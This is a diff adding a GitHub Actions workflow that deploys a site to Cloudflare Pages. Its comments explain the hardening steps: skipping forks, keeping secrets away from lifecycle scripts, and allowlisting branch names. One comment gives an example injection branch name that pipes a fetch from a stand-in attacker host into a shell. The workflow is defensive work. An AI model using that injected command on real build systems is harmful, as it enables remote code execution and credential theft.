@@ -1,0 +1,135 @@
+name: Deploy
+
+on:
+  push:
+    branches: [main]
+  pull_request:
+  workflow_dispatch:
+
+concurrency:
+  # Not cancel-in-progress. A cancelled deploy is a half-uploaded site, and the run that
+  # cancelled it may itself be cancelled by the next one - so the last thing actually deployed
+  # would be nobody's idea of the current state. Queueing costs a few minutes; the alternative
+  # costs correctness.
+  group: deploy-${{ github.head_ref || github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  contents: read
+  # For the GitHub Deployment the action records, so a PR shows where its preview went.
+  deployments: write
+
+jobs:
+  deploy:
+    name: Cloudflare Pages
+    runs-on: blacksmith-2vcpu-ubuntu-2404
+
+    # A fork gets no deployment, for exactly the reason it gets no `npm ci`: GitHub does not
+    # give fork workflows access to secrets, and the fix for that is never
+    # `pull_request_target` - that runs untrusted code with the credentials, trading an
+    # inconvenience for a credential compromise. See CONTRIBUTING.md.
+    #
+    # Skipped by condition rather than left to fail, so that a red cross on a fork's PR means
+    # something is wrong rather than "as expected".
+    if: github.event_name != 'pull_request' || github.event.pull_request.head.repo.full_name == github.repository
+
+    env:
+      # Read through the environment rather than interpolated straight into a `run:` block.
+      # `${{ }}` substitution happens before the shell sees the script, so a branch name is
+      # code at that point rather than data.
+      BRANCH: ${{ github.head_ref || github.ref_name }}
+
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+
+      # Git permits a great deal in a ref name. It forbids spaces, `~`, `^`, `:`, `?`, `*`,
+      # `[` and `\` — and permits `;`, `&`, `|`, `$`, `(`, `)` and backticks. So
+      # `main;curl evil.example|sh` is a legal branch, and this workflow puts the branch name
+      # into a command that a shell will run. The job already refuses pull requests from
+      # forks, which means this is not reachable by a stranger; it is still one push away from
+      # anyone who can create a branch here, and "only our own contributors could exploit it"
+      # is not a security property worth relying on.
+      #
+      # An allowlist rather than an escape: there is no branch this project needs whose name
+      # is outside this set, so the safe answer is to refuse the rest rather than to be clever
+      # about quoting it.
+      - name: Refuse a branch name that is not a branch name
+        run: |
+          if ! printf '%s' "$BRANCH" | grep -Eq '^[A-Za-z0-9][A-Za-z0-9._/-]{0,99}$'; then
+            echo "Refusing to deploy: the branch name is not in [A-Za-z0-9._/-]." >&2
+            exit 1
+          fi
+
+      - name: Reject a literal token in .npmrc
+        run: node scripts/check-npmrc.mjs
+
+      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0
+        with:
+          node-version-file: .nvmrc
+          cache: npm
+
+      # --ignore-scripts for the same reason as in ci.yml: a transitive dependency's
+      # postinstall would otherwise run with WEBAWESOME_NPM_TOKEN in its environment.
+      - name: Install (no lifecycle scripts)
+        run: npm ci --ignore-scripts
+        env:
+          WEBAWESOME_NPM_TOKEN: ${{ secrets.WEBAWESOME_NPM_TOKEN }}
+
+      # The one check that has to run here as well as in CI. Everything else in `verify` gates
+      # merging; this gates *deploying*, and the two are not the same event — a `_headers`
+      # broken on main would otherwise ship and then be discovered by users who cannot get the
+      # new version because the old service worker will not step aside.
+      - name: Caching contract
+        run: npm run check:deploy
+
+      # `vite build` resolves @matter-manager/core and @matter-manager/data through their
+      # emitted declarations and JS, so the project references have to be built first. Without
+      # this the build fails with "Failed to resolve import", which reads like a missing
+      # dependency rather than a missing build step.
+      - name: Build workspace packages
+        run: npm run typecheck
+
+      - name: Build the site
+        run: npm --workspace @matter-manager/web run build
+
+      # Direct Upload rather than Cloudflare's Git integration, so that what is deployed is
+      # what this repository's own pipeline built - same Node version, same lockfile, same
+      # Web Awesome Pro token. A second build system with its own opinions is a second place
+      # for "works on main" to stop being true.
+      #
+      # The project must already exist: `wrangler pages deploy` can create one interactively,
+      # and an Actions runner is not a TTY, so it errors instead. Created once with
+      # `npx wrangler pages project create matter-manager --production-branch=main`.
+      # See docs/adr/0014-cloudflare-pages-deployment.md.
+      - name: Deploy
+        id: deploy
+        uses: cloudflare/wrangler-action@ebbaa1584979971c8614a24965b4405ff95890e0 # v4.0.0
+        with:
+          apiToken: ${{ secrets.CLOUDFLARE_API_TOKEN }}
+          accountId: ${{ secrets.CLOUDFLARE_ACCOUNT_ID }}
+          gitHubToken: ${{ secrets.GITHUB_TOKEN }}
+          # `--branch` is what decides production from preview: a deployment whose branch is
+          # the project's production branch (main) is production, anything else is a preview
+          # at <branch>.matter-manager.pages.dev. `github.head_ref` is set only for pull
+          # requests, so `BRANCH` reads as "the PR's branch, or whatever branch was pushed".
+          #
+          # `$BRANCH` and not `${{ env.BRANCH }}`: the value has been checked against an
+          # allowlist above, and reaching it through the shell rather than through template
+          # substitution keeps it data at the only moment that matters.
+          command: >-
+            pages deploy packages/web/dist
+            --project-name=matter-manager
+            --branch=$BRANCH
+
+      - name: Say where it went
+        env:
+          DEPLOYMENT_URL: ${{ steps.deploy.outputs.deployment-url }}
+          ALIAS_URL: ${{ steps.deploy.outputs.pages-deployment-alias-url }}
+        run: |
+          {
+            echo "### Deployed"
+            echo
+            echo "- Branch: \`$BRANCH\`"
+            echo "- This deployment: $DEPLOYMENT_URL"
+            echo "- Branch alias: $ALIAS_URL"
+          } >> "$GITHUB_STEP_SUMMARY"
